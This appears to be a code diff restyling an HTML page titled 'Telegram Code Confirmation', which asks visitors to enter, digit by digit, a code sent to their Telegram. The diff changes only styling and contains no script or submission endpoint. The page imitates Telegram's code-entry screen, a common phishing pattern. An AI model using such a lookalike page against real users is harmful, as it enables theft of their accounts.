@@ -25,26 +25,45 @@
         }
         h1 {
             color: #0088cc;
+            font-family: 'Telegram', sans-serif;
+            font-size: 28px;
+            margin-bottom: 10px;
         }
         p {
             color: #333;
+            font-family: 'Telegram', sans-serif;
+            font-size: 18px;
+            margin-bottom: 20px;
         }
         input[type="text"] {
-            width: 30px;
-            height: 30px;
+            width: 50px;
+            height: 70px;
             text-align: center;
             padding: 10px;
             margin-bottom: 5px;
             border: 1px solid #ccc;
             border-radius: 5px;
             font-family: 'Roboto', sans-serif;
-            transform: rotate(90deg);
+        }
+        .emoji {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            margin-top: 10px;
+            background-color: #0088cc;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-family: 'Telegram', sans-serif;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <span style="font-size: 24px;">📩</span>
+        <span class="emoji">📩</span>
         <h1>Telegram Code Confirmation</h1>
         <p>Please confirm the code sent to your Telegram.</p>
         <form>
@@ -55,7 +74,7 @@
                 <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
                 <input type="text" maxlength="1" style="ime-mode: inactive; -webkit-ime-mode: inactive;">
             </div>
-            <button style="padding: 10px; margin-top: 10px; background-color: #0088cc; color: #fff; border: none; border-radius: 5px;">Confirm</button>
+            <button>Confirm</button>
         </form>
     </div>
 </body>
